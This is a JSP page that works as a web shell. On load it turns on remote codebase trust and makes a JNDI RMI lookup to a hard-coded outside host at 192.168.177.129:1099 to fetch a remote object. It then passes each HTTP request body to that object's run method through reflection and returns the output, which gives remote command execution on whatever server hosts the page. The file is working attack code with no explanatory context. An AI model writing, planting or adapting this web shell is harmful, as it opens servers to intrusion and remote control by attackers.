<%@ page import="javax.naming.NamingException" %>
<%@ page import="java.util.Hashtable" %>
<%@ page import="javax.naming.Context" %>
<%@ page import="javax.naming.InitialContext" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!
    public class JNDI {

        public Object lookup(String url){
			try{
				Hashtable env = new Hashtable();
				env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
				System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
				System.setProperty("com.sun.jndi.cosnaming.object.trustURLCodebase","true");
				InitialContext ctx = new InitialContext(env);
				return ctx.lookup(url);
			}catch(NamingException e){
				e.printStackTrace();
			}
            
			return null;
        }
    }
%>
<%!
	Object obj = new JNDI().lookup("rmi://192.168.177.129:1099/Object");
%>
<%
    BufferedReader br = request.getReader();
    String str, wholeStr = "";
    while((str = br.readLine()) != null) {
        wholeStr += str + "\n";
    }
    br.close();
    
    if(wholeStr != null && !wholeStr.trim().equals("")){
        wholeStr = wholeStr.substring(0,wholeStr.length()-1);
        Method method = obj.getClass().getMethod("run", String.class);
        response.getWriter().print(((String)method.invoke(obj, wholeStr)));
    }
%>
